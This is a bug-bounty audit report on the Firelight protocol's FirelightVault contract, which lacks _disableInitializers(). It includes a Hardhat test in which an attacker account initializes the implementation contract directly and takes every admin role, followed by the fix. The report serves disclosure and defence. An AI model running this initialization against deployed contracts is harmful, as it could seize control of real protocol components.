# 59691 sc low missing disableinitializers allows direct implementation initialization leading to vault takeover

**Submitted on Nov 14th 2025 at 21:49:43 UTC by @gklptrgt for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight)

* **Report ID:** #59691
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/firelight-protocol/firelight-core/blob/main/contracts/FirelightVault.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The FirelightVault implementation contract is missing the `_disableInitializers()` call in its `constructor`, allowing anyone to directly initialize the implementation contract itself rather than going through the proxy. If exploited in production, this could allow an attacker to take control of the implementation contract, manipulate vault logic, and potentially compromise user funds through state corruption.

## Vulnerability Details

`FirelightVault` contract lacks the critical security measure of disabling initializers on the implementation contract. Without `_disableInitializers()` in the constructor, the implementation contract remains vulnerable to direct initialization attacks.

```solidity
contract FirelightVault is
    FirelightVaultStorage,
    ERC4626Upgradeable,
    AccessControlUpgradeable,
    PausableUpgradeable,
    ReentrancyGuardUpgradeable
{
    // ...


   // Missing constructor with _disableInitializers()
@> /// @custom:oz-upgrades-unsafe-allow constructor
@> constructor() {
@>   _disableInitializers();
@> }


   // ...
    function initialize(
        IERC20 _asset,
        string memory _name,
        string memory _symbol,
        bytes memory _initParams
    ) public initializer {
        InitParams memory initParams = abi.decode(_initParams, (InitParams));
        __ERC20_init(_name, _symbol);
        __ERC4626_init(_asset);
        __Pausable_init();
        __ReentrancyGuard_init();
        __AccessControl_init();
       // ...
```

## Impact Details

* **Direct Impact**: Attacker gains administrative control over the implementation contract.
* Manipulation of vault logic affecting user returns
* State corruption leading to incorrect share calculations
* Privilege escalation allowing further attacks
* Potential fund loss through manipulated withdrawal logic

## References

* OpenZeppelin Documentation, Avoid leaving a contract uninitialized: <https://docs.openzeppelin.com/contracts/5.x/api/proxy#caution:\\~:text=Avoid%20leaving%20a%20contract%20uninitialized>.

## Proof of Concept

## Proof of Concept

I created a test file called vulnerability.js in the test directory that demonstrates the vulnerability. You can run this test on your local environment to verify the issue:

File: test/vulnerability.js

```javascript
const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { deployVault } = require('./setup/fixtures.js');
const { upgrades } = require('hardhat');
const { expect } = require('chai');

describe('Vulnerability Proof', function() {
  
    it('should prove implementation contract can be initialized directly by anyone', async function() {

    // deploy vault
    const { firelight_vault, token_contract } = await loadFixture(deployVault);
    
    // Get the implementation contract address from the proxy
    const implementationAddress = await upgrades.erc1967.getImplementationAddress(await firelight_vault.getAddress());
    
    // Connect directly to the implementation contract
    const FirelightVault = await ethers.getContractFactory('FirelightVault');
    const implementation = FirelightVault.attach(implementationAddress);
    
    // Try to initialize the implementation contract directly with attacker parameters
    const attacker = (await ethers.getSigners())[1];
    
    // Modify parameters, attacker take control with it's own address.
    const maliciousInitParams = {
      defaultAdmin: attacker.address, 
      limitUpdater: attacker.address,
      blocklister: attacker.address, 
      pauser: attacker.address,
      periodConfigurationUpdater: attacker.address,
      depositLimit: 1,
      periodConfigurationDuration: 604800
    };
    
    // Encode data.
    const abi_coder = ethers.AbiCoder.defaultAbiCoder();
    const maliciousInitData = abi_coder.encode(
      ['address','address','address','address','address','uint256','uint48'], 
      Object.values(maliciousInitParams)
    );
    
    // Usually it should fail here but it succeeds.
    await implementation.connect(attacker).initialize(
      await token_contract.getAddress(),
      "Hacked Vault",
      "HACK",
      maliciousInitData
    );
    
    // check if attack worked
    const owner = await implementation.hasRole(await implementation.DEFAULT_ADMIN_ROLE(), attacker.address);
    expect(owner).to.be.true;
    
    console.log("Implementation contract was directly initialized by attacker");
    console.log("Attacker now has DEFAULT_ADMIN_ROLE on implementation contract");
  });
});
```

Then run the test file with following command.

`npx hardhat test test/vulnerability.js --verbose`

*Expected Result*: The test will pass, demonstrating that an attacker can directly initialize the implementation contract and gain administrative control.

## Fix

As stated in OpenZeppelin documentation, add the following constructor to your contract to prevent direct initialization attacks:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

This security measure prevents anyone from initializing the implementation contract directly, ensuring all interactions must go through the proxy where access control and security checks are properly enforced. Be sure to check the documentation for further details of this security mitigation.
